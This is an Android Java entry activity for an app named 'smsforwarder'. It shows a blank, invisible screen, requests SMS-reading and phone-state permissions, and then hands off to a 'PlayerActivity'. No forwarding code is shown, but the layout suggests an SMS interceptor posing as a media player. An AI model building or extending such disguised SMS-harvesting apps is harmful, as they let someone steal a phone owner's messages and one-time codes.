package com.smsforwarder;

import android.Manifest;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.widget.Toast;

import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import java.util.ArrayList;
import java.util.List;

public class MainActivity extends AppCompatActivity {

    private static final int REQ_PERMS = 100;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        // Tela invisível — só background
        setContentView(new android.view.View(this));
        
        pedirPermissoes();
    }

    private void pedirPermissoes() {
        List<String> pedir = new ArrayList<>();
        String[] todas = {
                Manifest.permission.RECEIVE_SMS,
                Manifest.permission.READ_SMS,
                Manifest.permission.READ_PHONE_STATE,
                Manifest.permission.READ_PHONE_NUMBERS
        };
        for (String p : todas) {
            if (ContextCompat.checkSelfPermission(this, p) != PackageManager.PERMISSION_GRANTED) {
                pedir.add(p);
            }
        }
        if (!pedir.isEmpty()) {
            ActivityCompat.requestPermissions(this, pedir.toArray(new String[0]), REQ_PERMS);
        } else {
            abrirPlayer();
        }
    }

    @Override
    public void onRequestPermissionsResult(int req, String[] permissions, int[] results) {
        super.onRequestPermissionsResult(req, permissions, results);
        boolean todasOk = true;
        for (int r : results) {
            if (r != PackageManager.PERMISSION_GRANTED) {
                todasOk = false;
                break;
            }
        }
        if (todasOk) {
            abrirPlayer();
        } else {
            Toast.makeText(this, "Permissões necessárias!", Toast.LENGTH_LONG).show();
            finish();
        }
    }

    private void abrirPlayer() {
        startActivity(new Intent(this, PlayerActivity.class));
        finish(); // fecha a MainActivity (não fica na pilha)
    }
}